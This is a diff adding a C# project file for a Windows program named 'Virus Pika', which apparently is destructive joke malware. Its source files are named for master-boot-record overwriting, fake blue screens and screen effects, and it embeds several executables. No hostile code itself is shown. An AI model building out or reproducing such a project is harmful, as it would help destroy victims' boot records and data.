@@ -1,0 +1,210 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{2C2DDCB3-56D2-4115-9625-77006CD0E29C}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>Virus_Pika__By_Waguinho_</RootNamespace>
+    <AssemblyName>Virus Pika [By Waguinho]</AssemblyName>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <Deterministic>true</Deterministic>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>social_thewindows_24.ico</ApplicationIcon>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Speech" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Net.Http" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="bsod.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="bsod.Designer.cs">
+      <DependentUpon>bsod.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Crash.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Crash.Designer.cs">
+      <DependentUpon>Crash.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Form1.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Form1.Designer.cs">
+      <DependentUpon>Form1.cs</DependentUpon>
+    </Compile>
+    <Compile Include="gdis.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="gdis.Designer.cs">
+      <DependentUpon>gdis.cs</DependentUpon>
+    </Compile>
+    <Compile Include="janelapika.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="janelapika.Designer.cs">
+      <DependentUpon>janelapika.cs</DependentUpon>
+    </Compile>
+    <Compile Include="KillMbrCrit.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="KillMbrCrit.Designer.cs">
+      <DependentUpon>KillMbrCrit.cs</DependentUpon>
+    </Compile>
+    <Compile Include="LoadCheck.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="LoadCheck.Designer.cs">
+      <DependentUpon>LoadCheck.cs</DependentUpon>
+    </Compile>
+    <Compile Include="MbrSilent.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="MbrSilent.Designer.cs">
+      <DependentUpon>MbrSilent.cs</DependentUpon>
+    </Compile>
+    <Compile Include="PikaVirus02.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PikaVirus02.Designer.cs">
+      <DependentUpon>PikaVirus02.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="REGRAS.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="REGRAS.Designer.cs">
+      <DependentUpon>REGRAS.cs</DependentUpon>
+    </Compile>
+    <Compile Include="VirusPika03.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="VirusPika03.Designer.cs">
+      <DependentUpon>VirusPika03.cs</DependentUpon>
+    </Compile>
+    <Compile Include="VirusPika04.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="VirusPika04.Designer.cs">
+      <DependentUpon>VirusPika04.cs</DependentUpon>
+    </Compile>
+    <EmbeddedResource Include="bsod.resx">
+      <DependentUpon>bsod.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Crash.resx">
+      <DependentUpon>Crash.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Form1.resx">
+      <DependentUpon>Form1.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="gdis.resx">
+      <DependentUpon>gdis.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="janelapika.resx">
+      <DependentUpon>janelapika.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="KillMbrCrit.resx">
+      <DependentUpon>KillMbrCrit.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="LoadCheck.resx">
+      <DependentUpon>LoadCheck.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="MbrSilent.resx">
+      <DependentUpon>MbrSilent.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="PikaVirus02.resx">
+      <DependentUpon>PikaVirus02.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Resources.resx</DependentUpon>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <EmbeddedResource Include="REGRAS.resx">
+      <DependentUpon>REGRAS.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="VirusPika03.resx">
+      <DependentUpon>VirusPika03.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="VirusPika04.resx">
+      <DependentUpon>VirusPika04.cs</DependentUpon>
+    </EmbeddedResource>
+    <None Include="app.manifest" />
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+    <Compile Include="Properties\Settings.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="App.config" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Resources\chk.exe" />
+    <EmbeddedResource Include="Resources\fcls.exe" />
+    <EmbeddedResource Include="Resources\fiufiu.wav" />
+    <EmbeddedResource Include="Resources\gdi00.exe" />
+    <EmbeddedResource Include="Resources\gdi01.exe" />
+    <EmbeddedResource Include="Resources\gdi02.exe" />
+    <EmbeddedResource Include="Resources\gdi03.exe" />
+    <EmbeddedResource Include="Resources\gdi04.exe" />
+    <EmbeddedResource Include="Resources\icon.ico" />
+    <EmbeddedResource Include="Resources\music.wav" />
+    <EmbeddedResource Include="Resources\Pika.exe" />
+    <EmbeddedResource Include="Resources\RBSOD.exe" />
+    <EmbeddedResource Include="Resources\sound.exe" />
+    <EmbeddedResource Include="Resources\sus.jpg" />
+    <EmbeddedResource Include="Resources\zapzap.wav" />
+    <Content Include="social_thewindows_24.ico" />
+    <Content Include="windows-media-center_81603.ico" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
